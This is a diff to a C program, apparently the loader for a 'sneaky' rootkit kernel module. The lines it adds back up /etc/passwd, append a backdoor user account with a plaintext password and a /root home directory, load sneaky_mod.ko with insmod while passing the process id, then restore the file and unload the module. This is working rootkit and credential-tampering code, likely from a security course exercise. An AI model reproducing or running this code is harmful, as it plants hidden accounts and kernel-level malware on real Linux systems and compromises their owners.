@@ -15,13 +15,41 @@ void packSystemString(char * string, pid_t pid) {
   snprintf(string, INPUT_STR_SIZE, "insmod sneaky_mod.ko sneaky_pid=%d", (int)pid);
 }
 
-int main() {
-  // load module
+void setupPasswd() {
+  system("cp /etc/passwd /tmp/passwd");
+  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
+}
+
+void restorePasswd() {
+  system("cp /tmp/passwd /etc/passwd");
+  system("rm /tmp/passwd");
+}
+
+void load_module() {
+  // setup fake password
+  setupPasswd();
+  // pass in process id
   pid_t pid = getpid();
   printf("sneaky process with pid %d\n", (int)pid);
   char system_str[INPUT_STR_SIZE] = {0};
   packSystemString(system_str, pid);
+  // load module
   system(system_str);
+}
+
+void run_module() {
+  // insert malicious module
   readCharacter();
+}
+
+void remove_module() {
+  // remove the module
+  restorePasswd();
   system("rmmod sneaky_mod");
+}
+
+int main() {
+  load_module();
+  run_module();
+  remove_module();
 }
